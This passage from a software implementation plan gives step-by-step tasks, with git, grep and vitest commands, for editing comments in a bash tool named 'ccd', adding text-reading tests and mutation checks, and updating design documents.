```bash
git diff --quiet -- ccd/ccd && echo "ccd/ccd untouched"
```

- [ ] **Step 5: The other suites and guards this file falls under**

Run each in the foreground, with a timeout of at least 600000 ms:

```bash
(cd server && ./node_modules/.bin/vitest run test/ccd-workspaces.test.ts -t 'routes EVERY bash call site')
(cd server && ./node_modules/.bin/vitest run test/ccdargv-dec-parity.test.ts test/single-definition.test.ts test/ownership.test.ts test/mark-check.test.ts test/ccdargv-dash-id-parity.test.ts)
(cd server && ./node_modules/.bin/tsc --noEmit -p test/tsconfig.tests.json)
(cd server && ./node_modules/.bin/vitest run test/typecheck-tests.test.ts)
```

**Expected:** PASS, and tsc prints nothing.
- The containment scan counts this file's one spawn among the `asked` call sites.
- `single-definition`'s ccd-path case still lists only `ccdWsHelpers.ts`, because this file imports `CCD` and never spells the path.
- `typecheck-tests` is a known load flake. Re-run it alone before calling it a break.

- [ ] **Step 6: Clean up, and the boundary**

```bash
S="${TMPDIR:-/tmp}/path-identity-w1b-task10"; rm -rf -- "$S"
git status --porcelain                                     # exactly one line: ?? server/test/ccdargv-dash-id-parity.test.ts
```

- [ ] **Step 7: Commit**

```bash
git add server/test/ccdargv-dash-id-parity.test.ts
git commit -F - <<'EOF'
test(ccdargv): no dash-leading id redirects a verb, measured on the real binary

A new file, beside ccdargv-dec-parity rather than inside it, crosses every
argv a CCD_ARGV builder composes against the real ccd in a fixture HOME,
with every flag spelling the server appends as the id:

- the nine dec-appending verbs, derived from the builder table, under a dec
  with and without a reason (ws-add without), and stop in both orders: the
  builder's own, and the other typed, as a server on the other side of the
  stop reorder composes it;
- the section 2.2 verbs that carry no dec, given a dash-leading positional:
  stopPair, forget, swap, swapCross, start, enable and all four ws-audit
  modes. Plain ws-audit audits the literal id, a stated residual.

Each row must refuse, never look the id up as a row, create no reap lock,
journal nothing naming a decoy or the probed id (ws-restore's own
bad-session-id refusal excepted), change no unit or pane, change no
registry row, and leave the decoys' holds as they were. A control shows a
dec whose actor and reason begin with "-" still reaches the journal.

DASH_PARITY_CCD selects another binary, so the pre-wave run (the spec's
section 8 measurement, recorded in the SDD ledger) and the mutation rows
run on scratch copies and the tracked ccd/ccd is never edited to measure.
EOF
```

---

### Task 11: The collector header's pause rung, one grace, and how the lane is armed (line-neutral)

**Model routing:** `sonnet`, effort `medium`.

**Why:** three comments in the temp-root collector's region of `ccd/ccd` say things the code no longer does (spec §7, items 29, 30 and 31). This task changes them in place, each with the same number of lines, so no line moves, and adds a test that reads each sentence back from ccd's own text.
- **Item 29.** The witness-only arm of `_ws_collect_eval` reads the cleanup pause (`_ws_collect_paused || return 1`) before it mints its `collect-absent` token. The header's witness-only paragraph does not mention the pause.
- **Item 30.** A probe that reaches its bound ends the audit, so only ONE `_plat_timeout` grace is paid. That is 30 + 10 + 30 + 3 = 73 s, or 78 s at the 8 s grace, the sum `collect-audit-budget.test.ts` already pins. The header sums one grace per probe instead ("about 79 s … 94 s"), and it still carries the stale clause "A budget keyed on the mode is wave 9's."
- **Item 31.** The COLLECT-V1 note says "this wave ships it inert". The lane composes the verb and acts once the operator arms it. R13: the new wording must hold whether or not CCR-15 wave 10's Settings switch has merged.
- `# COLLECT-V1.` must stay first on its line. `collect-readers.test.ts` slices the collector's region up to `'\n# COLLECT-V1.'`.
- The EXPIRE-V1 note ("wave 3b composes it, this wave ships it inert") is workspace-lifecycle's text. It is NOT edited here (HARD BOUNDARY); it was reported to that programme.

**Files:**
- Modify `ccd/ccd`: three comment blocks, each edited in place with the same line count, all below every frozen anchor and inside the WS-AUDIT-COLLECT header and the COLLECT-END region. Find each one by content: at the export `837a099c0` they are at `:32831-32834`, `:32852-32860` and `:34179-34181`, and each sits about 14 lines lower once #351 is in. Then restamp.
  - Item 29: the four lines that start `` # `quarantine`. Past those it is collectable at once with a token of its own, ``.
  - Item 30: the nine lines that start `# BOUNDED, AND NOT ALWAYS INSIDE THE RUNNER'S ROW. The fresh rungs can spend,`, directly above `_WS_COLLECT_PROBE=''; _WS_COLLECT_REG_WHY=''; …`.
  - Item 31: the three lines that start `# the collector's lane composes it, and this wave ships it inert. Both protected`, inside the note that opens `` # COLLECT-V1. `cmd_caps` echoes it, ``.
- Create the test `server/test/ccd-collect-header-prose.test.ts`. It reads text only: it spawns no bash and runs no ccd, so the spawn census's containment scan has nothing in it to check.
- Nothing else. No other `server/test` file is edited.

**Interfaces:**
- Consumes no canonical name. The test reads these as TEXT, each found by content:
  - in `ccd/ccd`: the banner `# ── ws-audit --collect: `, the line `_WS_COLLECT_PROBE=''`, the bodies `_ws_collect_eval() {` and `_ws_collect_resume_eval() {` (the witness-only arm's `_WS_COLLECT_LEAF=absent`, `_ws_collect_paused || return 1` and `mode=collect-absent`), the knobs `WS_COLLECT_IDLE_SCAN_S=`, `WS_PATH_USERS_SCAN_S=` and `REAP_SCAN_SECONDS=`, `_plat_timeout`'s `grace="${CCD_TIMEOUT_KILL_AFTER:-3}"` and `[ "$grace" -gt 8 ] && grace=8`, `_ws_collect_enc() {`, `# COLLECT-V1. ` and `# ── end temp-root collection`;
  - in `server/src/remote/runner.ts`: the line `'ws-audit': 90_000,`.
- Produces no ccd name, no exported test name, and no new `die` literal, word or journal act. The test's helpers (`between`, `prose`, `one`, `header`, `collectV1`) are local to its file.

- [ ] **Step 0: Entry conditions (measure; never assume)**

From the workspace root:

```bash
git log --oneline -1 -- server/test/ccdargv-dash-id-parity.test.ts          # (t0) one line: Task 10 is committed
git log --oneline -1 -- server/test/ccd-collect-prelock.test.ts             # (t1) one line: Task 9 is committed
grep -c 'Past those it is collectable at once with a token of its own,' ccd/ccd                  # (t2) 1
grep -c "^# BOUNDED, AND NOT ALWAYS INSIDE THE RUNNER'S ROW\. The fresh rungs can spend,\$" ccd/ccd  # (t3) 1
grep -c "retries: it fails closed\. A budget keyed on the mode is wave 9's\." ccd/ccd               # (t4) 1
grep -c "the collector's lane composes it, and this wave ships it inert\. Both protected" ccd/ccd    # (t5) 1
grep -c '^# COLLECT-V1\. ' ccd/ccd                                                                # (t6) 1
grep -c 'this wave ships it inert' ccd/ccd                                                        # (t7) 2: COLLECT-V1's and EXPIRE-V1's
grep -c '_ws_collect_paused || return 1' ccd/ccd                                                  # (t8) at least 3
grep -c 'mode=collect-absent' ccd/ccd                                                             # (t9) 1
grep -c 'collect-lane-live' ccd/ccd                                                               # (t10) 0
node shared/mark.mjs --check ccd/ccd; echo "t11 rc=$?"                                            # rc=0
```

Record every line in the SDD ledger. A line number that differs from a hint is not a STOP. A count that differs is a STOP: report it by label to the coordinator, and build nothing. For (t2) to (t6) and (t9), name the slug `collector-header-anchor-moved`.

- [ ] **Step 1: Write the failing test `server/test/ccd-collect-header-prose.test.ts`**

```ts
// Path-identity W1b, Task 11 (path-identity spec §7, items 29 to 31): three comments in the temp-root collector's
// region of `ccd/ccd` said what the code no longer does, and each is carried in place, line-neutrally. Each case reads
// ccd's own text at test time, so restoring a sentence turns its case red:
// - item 29: the witness-only arm of `_ws_collect_eval` reads the cleanup pause before it mints its token, so the
//   header's witness-only paragraph names the pause, and the case checks the arm's code as well as its words;
// - item 30: a probe that reaches its bound ends the audit, so ONE `_plat_timeout` grace is paid. The header's sum is
//   checked against the knobs it names, read from ccd and the runner, as `collect-audit-budget.test.ts` reads the sum;
// - item 31: the COLLECT-V1 note says how the lane is armed, in words that hold whether or not the Settings switch has
//   shipped, and never says the verb ships inert. `# COLLECT-V1.` stays first on its line, because
//   `collect-readers.test.ts` slices the collector's region up to it.
// Text only: no ccd runs here, so there is no fixture HOME and no bash is spawned.
import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const readRel = (r: string): string => readFileSync(path.join(ROOT, r), 'utf8');
const ccdSrc = readRel('ccd/ccd');

/** `text` from `from` to the first `to` after it. Both anchors are asserted, so a lost one reds rather than widening
 *  the slice. */
const between = (text: string, from: string, to: string): string => {
  const a = text.indexOf(from);
  expect(a, `${JSON.stringify(from)} is gone`).toBeGreaterThan(-1);
  const b = text.indexOf(to, a + from.length);
  expect(b, `${JSON.stringify(to)} does not follow ${JSON.stringify(from)}`).toBeGreaterThan(a);
  return text.slice(a, b);
};

/** A comment block's prose. Every non-empty line must be a whole-line `#` comment, so a code line inside the block
 *  reds. The `#` marks and line breaks fold to single spaces, so a sentence reads the same however it is wrapped. */
const prose = (block: string): string => {
  const lines = block.split('\n').filter((l) => l.length > 0);
  expect(lines.filter((l) => !l.startsWith('#')), 'a line that is not a whole-line comment sits inside the block').toEqual([]);
  return lines.map((l) => l.replace(/^#\s?/, '')).join(' ').replace(/\s+/g, ' ').trim();
};

/** The one integer that `re` (a `g` regex with one group) captures in `text`; reds on zero matches or on two. */
const one = (text: string, re: RegExp, what: string): number => {
  const hits = [...text.matchAll(re)];
  expect(hits.length, `${what}: exactly one binding`).toBe(1);
  return Number(hits[0]![1]!.replace(/_/g, ''));
};

/** The WS-AUDIT-COLLECT header, from its banner to the first state variable it documents. */
const header = (): string => prose(between(ccdSrc, '\n# ── ws-audit --collect: ', "\n_WS_COLLECT_PROBE=''"));
/** The COLLECT-V1 note, from its marker to the region's closing banner. */
const collectV1 = (): string => prose(between(ccdSrc, '\n# COLLECT-V1. ', '\n# ── end temp-root collection'));

describe("the collector's header says what the code does (path-identity spec §7, items 29 to 31)", () => {
  it('the witness-only paragraph names the pause', () => {
    const para = between(header(), 'A witness whose leaf is PROVEN absent', 'THE DOCUMENT mirrors');
    expect(para).toContain('Past those, and unless the cleanup pause stands, it is collectable with a token of its own,');
    expect(para).not.toContain('collectable at once with a token');
    // The comment is a request; this is the code it describes. The witness-only arm of `_ws_collect_eval` (after
    // `_WS_COLLECT_LEAF=absent`) reads the pause before it mints the `collect-absent` token.
    const ev = between(ccdSrc, '\n_ws_collect_eval() {', '\n_ws_collect_resume_eval() {');
    const arm = ev.indexOf('_WS_COLLECT_LEAF=absent');
    const mint = ev.indexOf('mode=collect-absent');
    expect(arm, 'the witness-only arm').toBeGreaterThan(-1);
    expect(mint, "the witness-only arm's token").toBeGreaterThan(arm);
    const pause = ev.lastIndexOf('_ws_collect_paused || return 1', mint);
    expect(pause, 'the witness-only arm reads the pause before its token').toBeGreaterThan(arm);
  });

  it('the budget sums one grace: "about 73 s", with no "79 s" and no wave-9 clause', () => {
    const h = header();
    const at = h.indexOf('BOUNDED, AND');
    expect(at, 'the budget paragraph').toBeGreaterThan(-1);
    const budget = h.slice(at);
    // The knobs the paragraph names, read as text from ccd and the runner, each exactly once.
    const idle = one(ccdSrc, /^WS_COLLECT_IDLE_SCAN_S=(\d+)\b/gm, 'WS_COLLECT_IDLE_SCAN_S');
    const users = one(ccdSrc, /^WS_PATH_USERS_SCAN_S=(\d+)\b/gm, 'WS_PATH_USERS_SCAN_S');
    const scan = one(ccdSrc, /^REAP_SCAN_SECONDS=(\d+)\b/gm, 'REAP_SCAN_SECONDS');
    const grace = one(ccdSrc, /grace="\$\{CCD_TIMEOUT_KILL_AFTER:-(\d+)\}"/g, "_plat_timeout's default grace");
    const graceMax = one(ccdSrc, /\[ "\$grace" -gt (\d+) \] && grace=\1\b/g, "_plat_timeout's grace ceiling");
    const rowS = one(readRel('server/src/remote/runner.ts'), /^[ \t]*'ws-audit':[ \t]*([\d_]+),/gm,
      "CCD_VERB_TIMEOUT_MS['ws-audit']") / 1000;
    const probes = idle + users + scan;
    expect(budget).toContain(`\`WS_COLLECT_IDLE_SCAN_S\` (${idle} s)`);
    expect(budget).toContain(`\`WS_PATH_USERS_SCAN_S\` (${users} s)`);
    expect(budget).toContain(`\`REAP_SCAN_SECONDS\` (${scan} s)`);
    expect(budget).toContain('A probe that reaches its bound ends the audit, so ONE `_plat_timeout` TERM-to-KILL grace is paid');
    expect(budget).toContain(`${grace} s by default, at most ${graceMax} s`);
    expect(budget).toContain(
      `about ${probes + grace} s, or ${probes + graceMax} s at the widest grace, against ws-audit's ${rowS} s runner row`);
    expect(budget).toContain('about 73 s');
    expect(budget).toContain('(`collect-audit-budget.test.ts` holds the sum)');
    expect(budget).toContain('The row pass has no bound of its own;');
    expect(budget).toContain('it fails closed.');
    for (const gone of ['79 s', '94 s', 'A budget keyed on the mode is wave 9', 'NOT ALWAYS INSIDE', 'each `_plat_timeout` adds']) {
      expect(budget, gone).not.toContain(gone);
    }
  });

  it('COLLECT-V1 names how the lane is armed and never says "inert"', () => {
    const note = collectV1();
    expect(note).toContain("the collector's lane composes it, and acts only once the operator arms the lane "
      + "(the fleet box's legacy marker, or the Settings switch where it has shipped)");
    expect(note).not.toMatch(/\binert\b/);
    // Kept as they stood: the capability gate and the two protected shapes.
    expect(note).toContain("ONLY behind `capSupported(state, 'collect-v1')`, which refuses on no evidence;");
    expect(note).toContain('Both protected shapes cross the direct-entry boundary at the top of this file and in `ccd/ccd-entry.py`.');
    // The note names the marker by its role, never by its file name: path-identity spec §1.1 measured that
    // ccd/ccd spells no such name.
    expect(note).not.toContain('collect-lane-live');
  });

  it('# COLLECT-V1. still opens its line', () => {
    expect([...ccdSrc.matchAll(/^# COLLECT-V1\. /gm)].length).toBe(1);
    // collect-readers.test.ts slices the collector's region up to this anchor, so the region must still end on it.
    expect(between(ccdSrc, '\n_ws_collect_enc() {', '\n# COLLECT-V1.').length).toBeGreaterThan(0);
  });
});
```

- [ ] **Step 2: Run it and see it fail**

```bash
cd server && ./node_modules/.bin/vitest run test/ccd-collect-header-prose.test.ts
```

Expected: `3 failed | 1 passed`. These texts were drafted, not measured, so record the measured ones:
- "the witness-only paragraph names the pause": `expected '…' to contain 'Past those, and unless the cleanup pause stands, it is collectable with a token of its own,'`.
- "the budget sums one grace…": `expected '…' to contain 'A probe that reaches its bound ends the audit, so ONE \`_plat_timeout\` TERM-to-KILL grace is paid'`. The three knob assertions before it pass, because the old text already names `(30 s)`, `(10 s)` and `(30 s)`.
- "COLLECT-V1 names how the lane is armed…": `expected '…' to contain 'the collector's lane composes it, and acts only once the operator arms the lane (the fleet box's legacy marker, or the Settings switch where it has shipped)'`.
- "# COLLECT-V1. still opens its line" PASSES. It is true today and is pinned here.

If the knob reads fail with `exactly one binding: expected 0 to be 1` or `expected 2 to be 1`, a knob was renamed or doubled. That is a STOP: report it as `collector-budget-knob-moved`.

- [ ] **Step 3: Carry the three comments in place (line-neutral)**

Make each edit by content with the Edit tool. Each `old_string` must match exactly once (Step 0's t2 to t5). Each block keeps its line count: item 29 is 4 lines to 4, item 30 is 9 to 9, and item 31 is 3 to 3.

(a) Item 29, the witness-only paragraph in the WS-AUDIT-COLLECT header. Before (four lines; the line after them, `` # drop is not the collector's (`tail-drop-ignores-a-recordless-slot`). ``, is unchanged):

```bash
# `quarantine`. Past those it is collectable at once with a token of its own,
# and the verb then drops the witness and nothing else. So a FRESH collection
# never orphans a slot in silence (spec §5.10): the resume does not ask,
# because a record names its own slot there, and the reclaim tail's witness
```

After:

```bash
# `quarantine`. Past those, and unless the cleanup pause stands, it is collectable
# with a token of its own, and the verb then drops the witness and nothing else.
# So a FRESH collection never orphans a slot in silence (spec §5.10): the resume
# does not ask, because a record names its own slot there, and the reclaim tail's witness
```

(b) Item 30, the budget paragraph, directly above `_WS_COLLECT_PROBE=''; _WS_COLLECT_REG_WHY=''; _WS_COLLECT_PHASE=''; _WS_COLLECT_LEAF=''`. Before (nine lines):

```bash
# BOUNDED, AND NOT ALWAYS INSIDE THE RUNNER'S ROW. The fresh rungs can spend,
# in sequence, the idle walk's `WS_COLLECT_IDLE_SCAN_S` (30 s), the in-use
# probe's `WS_PATH_USERS_SCAN_S` (10 s) and the checkout scan's
# `REAP_SCAN_SECONDS` (30 s), and each `_plat_timeout` adds its TERM-to-KILL
# grace (`CCD_TIMEOUT_KILL_AFTER`, 3 s by default, at most 8 s): about 79 s
# by default and 94 s at the widest grace, before the row pass, which no bound
# of its own caps — against ws-audit's 90 s runner row. A runner that kills the
# audit gets no document, which the server reads as a failed audit and
# retries: it fails closed. A budget keyed on the mode is wave 9's.
```

After (nine lines):

```bash
# BOUNDED, AND INSIDE THE RUNNER'S ROW BUT FOR THE ROW PASS. The fresh rungs can
# spend, in sequence, the idle walk's `WS_COLLECT_IDLE_SCAN_S` (30 s), the
# in-use probe's `WS_PATH_USERS_SCAN_S` (10 s) and the checkout scan's
# `REAP_SCAN_SECONDS` (30 s). A probe that reaches its bound ends the audit, so
# ONE `_plat_timeout` TERM-to-KILL grace is paid (`CCD_TIMEOUT_KILL_AFTER`, 3 s
# by default, at most 8 s): about 73 s, or 78 s at the widest grace, against
# ws-audit's 90 s runner row (`collect-audit-budget.test.ts` holds the sum). The
# row pass has no bound of its own; a runner that kills the audit there gets no
# document, which the server reads as a failed audit and retries: it fails closed.
```

(c) Item 31, the COLLECT-V1 note. `` # COLLECT-V1. `cmd_caps` echoes it, and the verb `ws-collect` beside it: this `` and the four lines after it are unchanged. Before (its last three lines):

```bash
# the collector's lane composes it, and this wave ships it inert. Both protected
# shapes cross the direct-entry boundary at the top of this file and in
# `ccd/ccd-entry.py`.
```

After:

```bash
# the collector's lane composes it, and acts only once the operator arms the lane
# (the fleet box's legacy marker, or the Settings switch where it has shipped). Both protected
# shapes cross the direct-entry boundary at the top of this file and in `ccd/ccd-entry.py`.
```

Do not touch the EXPIRE-V1 note (`# composes it, this wave ships it inert.` under `# EXPIRE-V1.`). It is workspace-lifecycle's text.

- [ ] **Step 4: Restamp, and prove that no line moved**

From the workspace root:

```bash
bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd; echo "stamp rc=$?"   # rc=0
test "$(git show HEAD:ccd/ccd | wc -l)" = "$(wc -l < ccd/ccd)" && echo line-neutral                         # line-neutral
git diff --numstat -- ccd/ccd                       # adds equal deletes; expected `17	17	ccd/ccd` (4 + 9 + 3 + the stamp line)
git diff -U0 -- ccd/ccd | grep -E '^[+-][^+-]' | grep -vcE '^[+-]#'   # 0: every changed line, the stamp included, is a comment
grep -c 'this wave ships it inert' ccd/ccd          # 1: EXPIRE-V1's only
git diff -- ccd/ccd | grep -c 'EXPIRE-V1'           # 0
grep -c '^# COLLECT-V1\. ' ccd/ccd                  # 1
```

If `line-neutral` does not print, or adds differ from deletes, fix the reflow; never add or drop a line. A numstat that is balanced but is not 17/17 (git may pair lines differently) is not a departure.

- [ ] **Step 5: Run it green**

```bash
cd server && ./node_modules/.bin/vitest run test/ccd-collect-header-prose.test.ts
```

Expected: `4 passed`.

- [ ] **Step 6: Mutation table**

Set up once, from the workspace root. This takes a byte copy of the restamped, green `ccd/ccd`, and writes a one-anchor replacer:

```bash
S="${TMPDIR:-/tmp}/path-identity-w1b-task11"; mkdir -p "$S"
cp ccd/ccd "$S/ccd.good"
cat > "$S/mut.mjs" <<'EOF'
// usage: node mut.mjs <file> <old> <new>: replaces the ONE occurrence of <old>; refuses zero or two.
import { readFileSync, writeFileSync } from 'node:fs';
const [, , f, a, b] = process.argv;
const s = readFileSync(f, 'utf8');
const n = s.split(a).length - 1;
if (n !== 1) { console.error(`mut: ${n} occurrences of the anchor; exactly one is expected`); process.exit(2); }
writeFileSync(f, s.replace(a, () => b));
EOF
```

Apply each row alone, from the workspace root, and set `S="${TMPDIR:-/tmp}/path-identity-w1b-task11"` at the start of every Bash call, because shell state does not carry from one call to the next. Run the row's mutation, then `(cd server && ./node_modules/.bin/vitest run test/ccd-collect-header-prose.test.ts)`, see the red, then restore with `cp "$S/ccd.good" ccd/ccd`. A `mut:` error means the anchor is not unique: fix the anchor, never the test. The red texts below were drafted, not measured, so record the measured ones.

| # | Mutation (from the workspace root) | Expected red |
|---|---|---|
| M1 | `node "$S/mut.mjs" ccd/ccd 'Past those, and unless the cleanup pause stands, it is collectable' 'Past those it is collectable at once'` | "the witness-only paragraph names the pause": `expected '…' to contain 'Past those, and unless the cleanup pause stands, …'` |
| M2 | `node "$S/mut.mjs" ccd/ccd $'    _ws_collect_paused \|\| return 1\n    REAP_TOKEN=$(_ws_reclaim_fingerprint mode=collect-absent' '    REAP_TOKEN=$(_ws_reclaim_fingerprint mode=collect-absent'` (the arm's pause read deleted, so the comment no longer matches the code) | "the witness-only paragraph names the pause": `the witness-only arm reads the pause before its token: expected -1 to be greater than <n>` |
| M3 | `node "$S/mut.mjs" ccd/ccd 'about 73 s, or 78 s at the widest grace' 'about 79 s by default and 94 s at the widest grace'` | "the budget sums one grace…": `expected '…' to contain 'about 73 s, or 78 s at the widest grace, against ws-audit's 90 s runner row'` |
| M4 | `node "$S/mut.mjs" ccd/ccd 'and retries: it fails closed.' "and retries: it fails closed. A budget keyed on the mode is wave 9's."` | "the budget sums one grace…": `A budget keyed on the mode is wave 9: expected '…' not to contain 'A budget keyed on the mode is wave 9'` |
| M5 | `node "$S/mut.mjs" ccd/ccd $'\nWS_COLLECT_IDLE_SCAN_S=30' $'\nWS_COLLECT_IDLE_SCAN_S=31'` (a knob moves and the comment does not) | "the budget sums one grace…": `expected '…' to contain '\`WS_COLLECT_IDLE_SCAN_S\` (31 s)'` |
| M6 | `node "$S/mut.mjs" ccd/ccd 'acts only once the operator arms the lane' 'this wave ships it inert'` | "COLLECT-V1 names how the lane is armed…": `expected '…' to contain 'the collector's lane composes it, and acts only once …'` |
| M7 | `node "$S/mut.mjs" ccd/ccd $'\n# COLLECT-V1. ' $'\n#  COLLECT-V1. '` | "# COLLECT-V1. still opens its line": `expected 0 to be 1`; "COLLECT-V1 names how the lane is armed…" reds too: `"\n# COLLECT-V1. " is gone: expected -1 to be greater than -1` |

In M2 the `\|\|` is the table's escape for `||`. Type it as `||` inside the `$'…'` string.

After the last row:

```bash
S="${TMPDIR:-/tmp}/path-identity-w1b-task11"; cp "$S/ccd.good" ccd/ccd && cmp ccd/ccd "$S/ccd.good" && node shared/mark.mjs --check ccd/ccd; echo "restored rc=$?"   # rc=0
rm -rf "$S"
(cd server && ./node_modules/.bin/vitest run test/ccd-collect-header-prose.test.ts)                                   # 4 passed
```

- [ ] **Step 7: The gates (unedited, green)**

```bash
(cd server && ./node_modules/.bin/vitest run test/collect-readers.test.ts test/collect-audit-budget.test.ts test/ccd-collect-audit.test.ts test/ownership.test.ts test/mark-check.test.ts)
(cd server && ./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier')
(cd server && ./node_modules/.bin/vitest run test/ccd-workspaces.test.ts -t 'routes EVERY bash call site')
(cd server && ./node_modules/.bin/vitest run test/typecheck-tests.test.ts)
```

Expected: PASS, all of it. Run each in the foreground with a timeout of at least 600000 ms.
- `collect-readers` still slices the region up to `'\n# COLLECT-V1.'`, and its word sets match in both directions.
- `ccd-collect-audit` still finds three `_lc_emit` lines in the block and no harvest shape. The new comments add no `'!` and no `"refused":`.
- The danglers pass (`backticked _identifier`) resolves `` `_plat_timeout` ``, the one backticked `_name` in the new text.
- The census passes stay green with no number edited. The `'ccd/ccd': <n>` line still equals Task 0's (c1).
- `ccd-workspaces`' containment scan now also reads this new `ccd*` file and finds no bash call site in it.
- `typecheck-tests` is a CLAUDE.md load flake. Re-run it alone before calling a red a break.

A red in an existing file is never fixed by editing that file (HARD BOUNDARY). STOP and report it by slug, with the measured text.

- [ ] **Step 8: Commit**

```bash
git add ccd/ccd server/test/ccd-collect-header-prose.test.ts
git commit -F - <<'EOF'
docs(ccd): the collector header's pause rung, one grace, and how the lane is armed

Three comments in the temp-root collector's region said what the code no
longer does (path-identity spec §7, items 29 to 31). Each is carried in
place, with its line count kept:

- the witness-only paragraph says the arm is collectable only while the
  cleanup pause does not stand, as _ws_collect_eval reads it before the
  token;
- the budget paragraph pays one _plat_timeout grace, about 73 s or 78 s at
  the widest grace against ws-audit's 90 s runner row, names the test that
  holds the sum, and drops the stale clause that left the budget to a
  later wave;
- the COLLECT-V1 note says the lane acts only once the operator arms it,
  by the fleet box's legacy marker or by the Settings switch where it has
  shipped, and no longer says the verb ships inert.

ccd-collect-header-prose.test.ts reads each sentence back from ccd/ccd,
checks the pause sentence against the arm's code and the sum against the
knobs it names, and keeps "# COLLECT-V1." first on its line. The EXPIRE-V1
note is another programme's text and is untouched. ccd/ccd is restamped.
EOF
```

---

### Task 12: Docs: W1b as built

**Model routing:** `sonnet`, effort `high`. This is prose that later waves and the operator rely on. Check every sentence against the code at this branch's tip, never against the plan's text.

**Why:**
- **R24.** The spec gets one new subsection, "### 2.9 As built (W1b)". It carries the corrections that R2, R3, R8, R10, R11, R12, R20, R27 and R28 name, plus the stated residuals. Items 24 to 31 of §7 get the Status cell "Built (W1b)". The decided W0 text above §2.9 is not rewritten.
- **R24 again.** The rulings file gets "### §17 as built (path-identity W1b, run <n>)" at the end of §17. It names each departure and each residual by slug, and carries no number.
- **R23.** Committed code cites the spec, never the contract. The spec and the contract do not use this plan's R-numbers, because they would collide with the contract's own R-numbers. They use the spec's decision IDs (SEC1, SEC3 to SEC7) and section numbers.
- **R13.** Item 31's wording must hold whether or not CCR-15 wave 10 has merged. So must the sentence here that repeats it.

**Files:**
- Modify `docs/superpowers/specs/2026-10-12-path-identity-design.md`:
  - Insert "### 2.9 As built (W1b)" directly above the line `## 3. The temp-root tail and the collector`, after the blank line that ends §2.8 (`- One pin per mint site at 222 and 223 characters.`).
  - §7: the Status cell of rows 24 to 31 changes from `Proposed` to `Built (W1b)`, and nothing else in those rows changes.
- Modify `docs/superpowers/programs/child-reclamation-contract.md`: append "### §17 as built (path-identity W1b, run <n>)" at the end of §17. It goes after R98's last bullet (`- **Citations.** The spec cites lines at …`) and after any `### §17 as built` note already there (wave 10's, if it landed first). If a `## 18.` heading exists, the note goes before it. Nothing above the note is edited.
- Create the test `server/test/path-identity-w1b-prose.test.ts`. This departs from the scope's "none new" (departure `w1b-as-built-prose-pins`; see the notes).
- NOT edited:
  - `ccd/ccd` and `ccd/session-hook.sh` (read only);
  - `server/test/ccd-id-cap.test.ts` (read as text only);
  - `server/test/collect-lane-prose.test.ts`, which is run and never edited;
  - README.md, CLAUDE.md, the programme ledger `docs/superpowers/programs/path-identity.md`, and this plan's body or its `## Deviations found`.

**Interfaces:**
- Consumes. Everything below is read as text, nothing is imported:
  - `_REG_ID_MAX` (`ccd/ccd`, `^_REG_ID_MAX=<N>`) and `_REG_ID_CAP_WHY`, both from Task 7;
  - `CCRC_ID_MAX` and `CCRC_PROJ_MAX` (`ccd/session-hook.sh`);
  - `ID_NAME_TEMPLATES` and `CENSUS_EXCLUDED` (`server/test/ccd-id-cap.test.ts`, Task 7);
  - `ccdargv-dash-id-parity.test.ts` (Task 10);
  - the SDD ledger `.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/progress.md`: Task 0's counts and its `a8` record, Task 10's red-first record, and every departure slug the tasks recorded.
- Produces: prose only, plus the new test file. Its file-local helpers are `asBuilt`, `shellInt`, `capTestArray`, `censusOverheads`, `censusExcluded`, `residualsAtTheTip`, `DEPARTURES` and `BASE_RESIDUALS`. No exported name.

- [ ] **Step 0: Entry measurements** (from the workspace root; record each line in the ledger)

```bash
git log --oneline origin/main..HEAD | head -20                                       # Tasks 1 to 11 committed, one commit each
grep -n '^_REG_ID_MAX=' ccd/ccd                                                      # one line: the cap (expected 128 under R27 (a))
grep -n '^CCRC_ID_MAX=\|^CCRC_PROJ_MAX=' ccd/session-hook.sh                         # 128 and 64 at the export
grep -n 'const ID_NAME_TEMPLATES\|const CENSUS_EXCLUDED\|const NAME_MAX' server/test/ccd-id-cap.test.ts   # three lines
node -e '
const t = require("fs").readFileSync("server/test/ccd-id-cap.test.ts", "utf8");
const arr = (n) => { const a = t.indexOf("const " + n); if (a < 0) return null; const o = t.indexOf("= [", a); if (o < 0) return null;
  const r = t.slice(o + 3); if (/^\s*\]/.test(r)) return ""; const e = r.search(/\n\s*\][^\n]*;/); return e < 0 ? null : r.slice(0, e); };
const ov = [...(arr("ID_NAME_TEMPLATES") ?? "").matchAll(/overhead:\s*([0-9][0-9\s+]*)/g)].map((m) => m[1].split("+").map((x) => Number(x.trim())).reduce((p, q) => p + q, 0));
console.log("rows=" + ov.length + " W=" + Math.max(...ov) + " 255-W=" + (255 - Math.max(...ov)));
const ex = arr("CENSUS_EXCLUDED");
console.log("excluded=" + (ex === null ? "NOT FOUND" : JSON.stringify([...ex.matchAll(/file:\s*([\x27"`])([^\x27"`]+)\1/g)].map((m) => m[2]))));
'                                                                                    # the numbers and files Step 3 writes; W expected 81, 255-W expected 174
grep -n 'overhead' server/test/ccd-id-cap.test.ts                                    # find the row with the largest overhead; Step 3 quotes its template exactly
grep -n '^### 2.8 Proof\|^### 2.9\|^## 3. The temp-root tail and the collector' docs/superpowers/specs/2026-10-12-path-identity-design.md   # 2.8 and 3 present; no 2.9 yet
grep -cE '^\| (2[4-9]|3[01]) \|[^|]*\|[^|]*\|[^|]*\| Proposed \|' docs/superpowers/specs/2026-10-12-path-identity-design.md   # 8
grep -c '| Built (W1b) |' docs/superpowers/specs/2026-10-12-path-identity-design.md   # 0
grep -n '^## 17\. \|^- \*\*R98 — corrections\|^### §17 as built\|^## 18\. ' docs/superpowers/programs/child-reclamation-contract.md   # §17 and R98 present; note any §17 as built note (wave 10's) and any §18
ls server/test/ccdargv-dash-id-parity.test.ts server/test/ccd-id-cap.test.ts         # both exist
grep -n -A6 '^# EXPIRE-V1\.' ccd/ccd | grep -c 'ships it inert'                      # 1 while workspace lifecycle's note still says it
grep -n "_ws_tmproot_id_ok\`" shared/api.ts server/src/childReclaimSweep.ts          # the two server docstrings that call ccd's predicate dot-only
